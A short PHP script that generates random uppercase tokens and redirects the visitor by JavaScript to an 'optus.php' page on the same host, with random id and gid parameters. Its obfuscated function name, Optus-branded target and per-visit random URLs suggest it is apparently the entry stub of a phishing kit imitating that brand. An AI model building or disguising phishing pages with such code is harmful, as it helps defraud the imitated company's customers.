<?php
function JIOeDKi_DE($length)
{
    $characters = 'ABCDEFJHIJGKLMNOPQRSTUVWXYZ0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0;$i < $length;$i++)
    {
        $randomString .= $characters[rand(0, $charactersLength - 1) ];
    }
    return $randomString;
}
$hach = sha1(microtime());
$one = JIOeDKi_DE(18);
$too = JIOeDKi_DE(4);
$too2 = JIOeDKi_DE(4);
$too3 = JIOeDKi_DE(7);
$max = JIOeDKi_DE(12);

$domine = "https://$_SERVER[HTTP_HOST]/optus.php?id=$max&gid=$one";
echo ("<script LANGUAGE='JavaScript'>
    window.location.href='$domine';
    </script>");
?>